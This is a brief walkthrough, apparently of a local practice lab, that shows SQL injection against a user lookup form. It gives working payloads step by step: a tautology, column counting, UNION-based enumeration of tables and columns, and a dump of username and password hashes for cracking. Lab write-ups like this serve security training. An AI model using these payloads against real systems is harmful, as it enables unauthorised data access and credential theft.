# [SQL Injection](http://localhost/vulnerabilities/sqli/)

A simple form where if you type in an id it returns the some content from 
the user having that id. The query probably looks something like this:

`SELECT id,first_name,surname FROM users WHERE id=$_GET["id"]`

Let's test for injection. If we type `' or 1=1-- ` we should get back all the 
users from the table. And we do! Five users.

But I want more information than just names. Let's see if we can get to some 
passwords. First, find out how many columns are being returned by the current 
query using `ORDER BY` until it errors out.

`admin' ORDER BY 1-- `

There are only two columns being returned. Presumably two string columns for 
first name and surname. You can confirm this by doing a `UNION`

`1' UNION SELECT 'a','a'-- `

Cool. Let's list the tables with `information_schema`

`' UNION SELECT table_name,'a' FROM information_schema.tables-- `

There are two tables of interest: `guestbook` and `users`

Let's see all the columns of both.

`' UNION SELECT table_name,column_name FROM information_schema.columns WHERE table_name = 'guestbook' OR table_name = 'users'-- `

And we want to dump all the username and password combinations now that 
we know the column names.

`' UNION SELECT concat(user,':',password),null FROM users-- `

Now we got password hashes for all users we can go crack! We won't crack them 
just yet.
